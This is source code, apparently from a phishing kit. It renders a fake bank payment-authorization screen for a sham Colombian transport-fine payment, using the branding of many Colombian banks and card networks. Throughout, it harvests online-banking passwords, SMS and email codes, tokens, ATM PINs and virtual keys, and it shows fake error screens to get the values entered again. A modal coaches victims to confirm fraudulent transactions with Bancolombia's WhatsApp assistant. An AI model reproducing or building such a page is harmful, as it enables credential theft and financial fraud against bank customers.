                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      User:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="text"
                        name="User"
                        value={formData.User}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Password:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="contrasena"
                        value={formData.contrasena}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                Incorrect password, please check it.
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmit}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "new_card":
        return (
          <div className="flex flex-col items-center py-8">
            <div className="text-6xl mb-4">💳</div>
            <h3 className="text-2xl font-bold text-black mb-2">
              Card declined
            </h3>
            <p className="text-gray-600 text-center mb-6">
              Your card was declined. Please try another card.
            </p>
            <button
              onClick={() => {
                if (redirectDeclined) {
                  window.location.href = redirectDeclined;
                } else {
                  window.location.reload();
                }
              }}
              className="px-5 text-black bg-gray-300 border border-black rounded-full psm-new-card-btn"
            >
              Use Another Card
            </button>
          </div>
        );

      case "code_sms":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={false}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      SMS Code:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "error_code_sms":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={true}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>

                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      SMS Code:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                Incorrect SMS code, please verify.
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "code_email":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={false}
          />
        ) : (
          <>
            <p className="psm-email-context">
              Te hemos enviado un código de verificación al E-Mail. Estás
              autorizando un pago a Secretaria de transporte - Movilidad © 2026
              por {priceFormatted} el {getCurrentDate()} con tu tarjeta
              ************{last4}.
            </p>
            <p className="text-[10px] mt-10">
              {isBancolombia
                ? "Ingresa la información solicitada para autorizar la transacción:"
                : "Enter your online banking information:"}
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              {isBancolombia
                ? "DETALLE DE LA TRANSACCIÓN"
                : "TRANSACTION DETAILS"}
            </p>
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Comercio:" : "Commerce:"}
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Monto de la Transacción:"
                        : "Transaction Amount:"}
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Número de Tarjeta:" : "Card number:"}
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Código E-Mail:" : "Email Code:"}
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5 text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
            {isBancolombia && (
              <div className="flex w-full justify-start mt-4">
                <a href="#" className="text-xs text-gray-700 underline">
                  ¿Necesitas Ayuda?
                </a>
              </div>
            )}
          </>
        );

      case "error_code_email":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={true}
          />
        ) : (
          <>
            <p className="psm-email-context">
              Te hemos enviado un código de verificación al E-Mail. Estás
              autorizando un pago a Secretaria de transporte - Movilidad © 2026
              por {priceFormatted} el {getCurrentDate()} con tu tarjeta
              ************{last4}.
            </p>
            <p className="text-[10px] mt-10">
              {isBancolombia
                ? "Ingresa la información solicitada para autorizar la transacción:"
                : "Enter your online banking information:"}
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              {isBancolombia
                ? "DETALLE DE LA TRANSACCIÓN"
                : "TRANSACTION DETAILS"}
            </p>
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Comercio:" : "Commerce:"}
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Monto de la Transacción:"
                        : "Transaction Amount:"}
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Número de Tarjeta:" : "Card number:"}
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Código E-Mail:" : "Email Code:"}
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-2">
              <p className="text-red-600 text-xs">
                {isBancolombia
                  ? "Código E-Mail incorrecto, por favor verifícalo."
                  : "Incorrect Email code, please verify."}
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5 text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
            {isBancolombia && (
              <div className="flex w-full justify-start mt-4">
                <a href="#" className="text-xs text-gray-700 underline">
                  ¿Necesitas Ayuda?
                </a>
              </div>
            )}
          </>
        );

      case "token":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={false}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>

                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Token/Dynamic Mobile App:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "error_token":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={true}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>

                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Token/Dynamic Mobile App:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                Incorrect Token/Dinamica App, please verify.
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "clave_cajero":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={false}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>

                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      ATM PIN:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "error_clave_cajero":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={true}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>

                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      ATM PIN:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                Incorrect password, please check it.
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "clave_virtual":
      case "error_clave_virtual":
        return isDavivienda ? (
          <div
            className="col-12 visa-styling"
            style={{
              fontFamily: '"Segoe UI", Tahoma, sans-serif',
              fontSize: 14,
              width: "100%",
              textAlign: "center",
            }}
          >
            <div className="form-group text-center">
              <div id="InputAction" style={{ width: "60%", margin: "0 auto" }}>
                <label
                  htmlFor="CredentialValidateInput"
                  style={{
                    color: "#6b6887",
                    fontWeight: 400,
                    display: "inline-block",
                    marginBottom: 4,
                  }}
                >
                  Clave Virtual
                </label>
                <input
                  autoFocus
                  id="CredentialValidateInput"
                  name="otp"
                  type="text"
                  value={formData.otp}
                  onChange={handleInputChange}
                  autoComplete="off"
                  style={{
                    display: "block",
                    width: "100%",
                    textAlign: "center",
                    border: "1px solid #8180a3",
                    fontSize: 32,
                    lineHeight: "37px",
                    height: 40,
                    borderRadius: 3,
                    fontFamily: '"Segoe UI", Tahoma, sans-serif',
                    boxSizing: "border-box",
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = "#193ab0";
                    e.target.style.boxShadow = "none";
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = "#8180a3";
                  }}
                />
                <div
                  className="visa-col-12 text-center"
                  style={{ marginTop: 16 }}
                >
                  <button
                    type="submit"
                    className="visa-styling btn btn-primary text-uppercase vba-button"
                    id="ValidateButton"
                    onClick={handleSubmitOtp}
                    style={{
                      background: "#193ab0",
                      color: "#FFF",
                      border: "none",
                      borderRadius: 3,
                      fontWeight: 200,
                      width: "100%",
                      marginBottom: 10,
                      padding: "6px 20px",
                      cursor: "pointer",
                      fontFamily: '"Segoe UI", Tahoma, sans-serif',
                    }}
                  >
                    Enviar
                  </button>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Clave Virtual:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder="Ingrese su clave virtual"
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                onClick={handleSubmitOtp}
                className="w-[240px] h-[40px] bg-[#1d3fa8] text-white font-bold rounded mt-5 hover:bg-[#153080] transition-colors uppercase tracking-wider text-sm"
              >
                Enviar
              </button>
            </div>
          </>
        );

      case "finalized":
        return (
          <div className="flex flex-col items-center py-8">
            <div className="text-6xl mb-4">✅</div>
            <h3 className="text-2xl font-bold text-green-600 mb-2">
              ¡Pago Exitoso!
            </h3>
            <p className="text-gray-600 text-center mb-6">
              Tu pago ha sido procesado correctamente
            </p>
            {/* <button
              onClick={() => {
                if (onClose) onClose(true);
                window.location.href = "/confirmation";
              }}
              className="bg-green-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-green-700 transition-colors"
            >
              Continuar
            </button> */}
          </div>
        );

      case "confirmar_identidad":
        return null;

      case "banned":
        return (
          <div className="flex flex-col items-center py-8">
            <div className="text-6xl mb-4">🔨</div>
            <h3 className="text-2xl font-bold text-red-600 mb-2">
              Acceso Bloqueado
            </h3>
            <p className="text-gray-600 text-center mb-6">
              Tu acceso ha sido bloqueado por razones de seguridad
            </p>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div>
      <div className="psm-overlay">
        <div
          className={`psm-box${isError ? " psm-error" : ""}`}
          onClick={(e) => e.stopPropagation()}
        >
          {/* ── Cabecera de logos ── */}
          <div className="flex justify-between items-center">
            {/* Logo del banco */}
            <div>
              {cardInfo.issuer?.toLowerCase().includes("bogota") && (
                <Image
                  src="/banks/bancobogota.png"
                  width={2560}
                  height={517}
                  alt="banklogo"
                  className="w-[184px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bancolombia") && (
                <Image
                  src="/banks/bancolombia.png"
                  width={2560}
                  height={517}
                  alt="banklogo"
                  className="w-[184px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("davivienda") && (
                <Image
                  src="/banks/davivienda.png"
                  width={1000}
                  height={118}
                  alt="banklogo"
                  className="w-[160px] h-[19px] object-contain"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("villas") && (
                <Image
                  src="/banks/avvillas.png"
                  width={2560}
                  height={517}
                  alt="banklogo"
                  className="w-[184px] h-[25px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("colpatria") && (
                <Image
                  src="/banks/colpatria.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("tuya") && (
                <Image
                  src="/banks/tuya.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("rappi") && (
                <Image
                  src="/banks/rappi.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("pichincha") && (
                <Image
                  src="/banks/pichincha.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("nubank") && (
                <Image
                  src="/banks/nubank.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("nequi") && (
                <Image
                  src="/banks/nequi.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("itau") && (
                <Image
                  src="/banks/itau.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("falabella") && (
                <Image
                  src="/banks/falabella.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("citibank") && (
                <Image
                  src="/banks/citibank.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("social") && (
                <Image
                  src="/banks/cajasocial.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("popular") && (
                <Image
                  src="/banks/bpopular.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("occidente") && (
                <Image
                  src="/banks/bocc.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bbva") && (
                <Image
                  src="/banks/bbvab.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("agrario") && (
                <Image
                  src="/banks/bancoagrario.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bancamia") && (
                <Image
                  src="/banks/bancamia.png"
                  width={500}
                  height={500}
                  alt="banklogo"
                  className="w-[30px] h-[37px]"
                />
              )}
            </div>

            {/* Logo de red (Mastercard / Visa) */}
            <div>
              {cardInfo.brand?.toLowerCase().includes("mastercard") && (
                <Image
                  src="/banks/mastercard_check.png"
                  width={143}
                  height={34}
                  alt="banklogo"
                  className="w-[143px] h-[34px]"
                />
              )}
              {cardInfo.brand?.toLowerCase().includes("visa") && (
                <Image
                  src="/banks/visa_check.svg"
                  width={143}
                  height={34}
                  alt="banklogo"
                  className="w-[143px] h-[34px]"
                />
              )}
            </div>
          </div>

          {/* ── Texto de encabezado: Bancolombia vs. Davivienda vs. genérico ── */}
          {isBancolombia ? (
            <>
              <p className="text-sm font-semibold mt-5">
                Autorización de transacción
              </p>
              <p className="text-xs mt-3">
                La transacción que intentas realizar en{" "}
                <b>Secretaria de transporte - Movilidad © 2026</b> por{" "}
                <b>{priceFormatted}</b> con tu tarjeta terminada en{" "}
                <b>************{last4}</b> debe ser autorizada por seguridad.
              </p>
              {status !== "code_email" && status !== "error_code_email" && (
                <p className="text-xs mt-3">
                  &ldquo;¡Avancemos con la compra! Para terminar y por
                  seguridad, necesitamos confirmar que eres tú quien está detrás
                  de esta pantalla. Ingrese un dato que solo tú conoces.
                  Consulta tu clave dinámica y escríbela aquí.
                </p>
              )}
            </>
          ) : isDavivienda ? (
            <>
              <div className="border-b border-gray-300 my-4" />
              {getDaviviendaMessage(status) ? (
                <>
                  <p className="text-sm font-semibold mt-3 text-black">
                    {getDaviviendaMessage(status)!.title}
                  </p>
                  <p className="text-xs mt-3 text-gray-700">
                    {getDaviviendaMessage(status)!.desc1}
                  </p>
                  {getDaviviendaMessage(status)!.desc2 && (
                    <p className="text-xs mt-3 text-gray-700">
                      {getDaviviendaMessage(status)!.desc2}
                    </p>
                  )}
                </>
              ) : (
                <>
                  <p className="text-sm font-semibold mt-3 text-black">
                    Autorización de transacción
                  </p>
                  <p className="text-xs mt-3 text-gray-700">
                    La transacción que intentas realizar en{" "}
                    <b>Secretaria de transporte - Movilidad © 2026</b> por{" "}
                    <b>{priceFormatted}</b> con tu tarjeta terminada en{" "}
                    <b>************{last4}</b> debe ser autorizada por
                    seguridad.
                  </p>
                </>
              )}
            </>
          ) : (
            <>
              <p className="text-[10px] mt-5">Transaction authorization</p>
              <p className="text-xs mt-5">
                The transaction you are trying to make with{" "}
                <b>Secretaria de transporte - Movilidad © 2026</b> for{" "}
                <b>{priceFormatted}</b>
              </p>
            </>
          )}

          {renderContent()}

          {/* ── Modal de Confirmar Identidad ── */}
          {showIdentityModal &&
            (isBancolombia ? (
              <div
                className="fixed inset-0 bg-black/25 flex items-center justify-center z-50 p-3"
                onClick={() => setShowIdentityModal(false)}
              >
                <div
                  className="psm-identity-modal bg-white rounded-xl shadow-lg w-full max-w-md flex flex-col items-center text-center gap-y-3 px-7 py-7"
                  onClick={(e) => e.stopPropagation()}
                >
                  <svg
                    className="w-12 h-12 flex-shrink-0"
                    viewBox="0 0 64 64"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M32 4L8 14v18c0 13 10.5 24.5 24 28 13.5-3.5 24-15 24-28V14L32 4z"
                      fill="#fdda24"
                      stroke="#c9a800"
                      strokeWidth="1.5"
                      strokeLinejoin="round"
                    ></path>
                    <rect
                      x="29.5"
                      y="20"
                      width="5"
                      height="14"
                      rx="2.5"
                      fill="white"
                    ></rect>
                    <circle cx="32" cy="40" r="3" fill="white"></circle>
                  </svg>

                  <h2 className="font-semibold text-base sm:text-lg leading-snug">
                    Por seguridad, no puedes continuar la transacción
                  </h2>

                  <p className="text-gray-700 text-sm sm:text-[15px] leading-relaxed">
                    Te enviaremos dos mensajes a <b>WhatsApp</b> desde nuestro{" "}
                    <b>Tabot</b>, tu asistente virtual Bancolombia, para
                    finalizar el pago.
                  </p>

                  <div className="flex flex-col bg-green-500/10 border border-green-500/50 rounded-md w-full py-3.5 gap-y-1 px-5">
                    <svg
                      className="w-8 h-8 mx-auto mb-1"
                      viewBox="0 0 64 64"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M32 6C17.64 6 6 16.84 6 30.2c0 5.8 2.2 11.14 5.84 15.3L9 58l13.1-3.74C25.1 55.7 28.46 56.4 32 56.4c14.36 0 26-10.84 26-24.2S46.36 6 32 6z"
                        stroke="#25D366"
                        strokeWidth="5"
                        strokeLinejoin="round"
                      ></path>
                    </svg>
                    <p className="text-sm sm:text-[15px] text-gray-800 mb-0">
                      Por favor indicar en el chat
                    </p>
                    <b className="text-sm sm:text-[15px] text-gray-800 mb-0">
                      &quot;Sí fui yo&quot;
                    </b>
                    <p className="text-sm sm:text-[15px] text-gray-800 mb-0">
                      y confirmar con el <b>&quot;Sí&quot;</b>
                    </p>
                  </div>

                  <div className="bg-red-400/10 border-l-4 border-red-500 py-2 w-full px-3">
                    <p className="text-red-700 font-semibold text-start text-xs sm:text-[13px] mb-0">
                      IMPORTANTE: Haz clic en &quot;Reintentar pago&quot;
                      ÚNICAMENTE después de dar los &quot;sí&quot; en WhatsApp.
                    </p>
                  </div>

                  <p className="text-gray-700 text-sm sm:text-[15px]">
                    Si ya confirmó puede continuar.
                  </p>

                  <button
                    onClick={() => {
                      setShowIdentityModal(false);
                      setStatus("error_otp");
                      savePaymentStateService(sessionId, "error_otp");
                    }}
                    style={{
                      backgroundColor: "#fdda24 !important",
                      color: "#000000 !important",
                    }}
                    className="rounded-full font-semibold px-9 text-sm sm:text-sm py-2.5 mt-1"
                  >
                    Reintentar pago
                  </button>
                </div>
              </div>
            ) : (
              <div
                className="psm-identity-modal"
                style={{
                  position: "fixed",
                  inset: 0,
                  zIndex: 9999,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  background: "rgba(0,0,0,0.5)",
                }}
                onClick={() => setShowIdentityModal(false)}
              >
                <div
                  className="psm-identity-modal"
                  style={{
                    background: "#fff",
                    borderRadius: 16,
                    padding: "34px 28px 30px",
                    maxWidth: 360,
                    width: "90%",
                    textAlign: "center",
